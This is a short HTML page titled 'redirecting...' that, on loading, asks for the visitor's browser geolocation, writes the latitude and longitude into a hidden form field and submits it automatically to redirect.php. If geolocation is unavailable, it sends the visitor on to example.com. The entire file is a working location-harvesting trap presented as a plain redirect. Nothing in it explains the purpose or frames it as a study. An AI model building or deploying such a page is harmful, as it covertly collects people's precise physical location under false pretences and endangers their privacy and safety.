<!DOCTYPE html>
<html>
<head>
	<title>redirecting...</title>
</head>
<body>

<form id="form1" action="redirect.php" method="post">
    <input type="hidden" id="ok" name="ok">
</form>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>
    
    $(document).ready(function(){
        if ("geolocation" in navigator){ 
            navigator.geolocation.getCurrentPosition(function(position){ 

                var lat = position.coords.latitude;
                var lon = position.coords.longitude;

                location1 = "\nLatitude: "+ lat + "," +" Longitude: " + lon; 

                $("#ok").val(location1);

                $("#form1").submit();
            });
        }
        else{
            window.location.replace("http://example.com/");
        }
    });
    
</script>
</body>
</html>
